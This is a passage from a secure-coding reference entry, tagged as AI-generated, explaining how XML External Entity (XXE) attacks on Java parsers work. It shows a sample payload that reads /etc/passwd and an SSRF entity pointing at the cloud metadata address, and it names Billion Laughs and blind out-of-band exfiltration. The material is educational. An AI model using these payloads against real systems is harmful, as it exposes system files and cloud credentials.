---
source: "languages/java/xxe.md"
title: "XML External Entity (XXE) Processing"
heading: "How XXE Works"
category: "language-vuln"
language: "java"
severity: "medium"
tags: [ai-generated, java, language-vuln, overview, parser, vulnerability, vulnerable]
chunk: 3/10
---

## How XXE Works

An XXE attack exploits the XML specification's ability to define entities that reference external resources:

```xml
<!-- Malicious XML payload -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

When parsed, `&xxe;` is replaced with the contents of `/etc/passwd`. The parsed content is returned to the attacker in the application's response. More advanced XXE attacks include:
- **SSRF**: `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`
- **DoS (Billion Laughs)**: Nested entity expansion causing OOM
- **Blind XXE**: Exfiltration via out-of-band HTTP/DNS requests